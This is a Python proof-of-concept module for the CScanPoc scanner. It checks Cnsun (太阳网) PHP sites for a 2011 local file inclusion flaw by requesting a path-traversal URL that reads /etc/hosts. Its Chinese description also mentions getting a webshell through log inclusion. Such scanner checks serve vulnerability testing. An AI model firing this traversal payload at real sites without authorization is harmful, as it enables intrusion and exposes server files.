# coding: utf-8
from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'Cnsun_0101' # 平台漏洞编号
    name = '太阳网php文件包含' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.LFI # 漏洞类型
    disclosure_date = '2011-07-12'  # 漏洞公布时间
    desc = '''
    php代码没有对include文件的路径进行判断，导致能够读取服务器敏感文件.
    或者可通过include apache日志 获取一个webshell 或者包含content_help.php文件本身造成死循环..CC攻击
    ''' # 漏洞描述
    ref = 'Unknown' # 漏洞来源
    cnvd_id = 'Unknown' # cnvd漏洞编号https://wooyun.shuimugan.com/bug/view?bug_no=2431
    cve_id = 'Unknown'  # cve编号
    product = 'Cnsun(太阳网)'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'c6f1daa3-f90b-4192-be18-52f832e35233' # 平台 POC 编号
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-06-11' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = "/content_help.php?module=content_helpmessagelist&helpid=../../../../etc/hosts"
            url = self.target+payload
            response = requests.get(url)
            if 'localhost' in response.text or '127.0.0.1' in response.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name))
        except Exception, e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
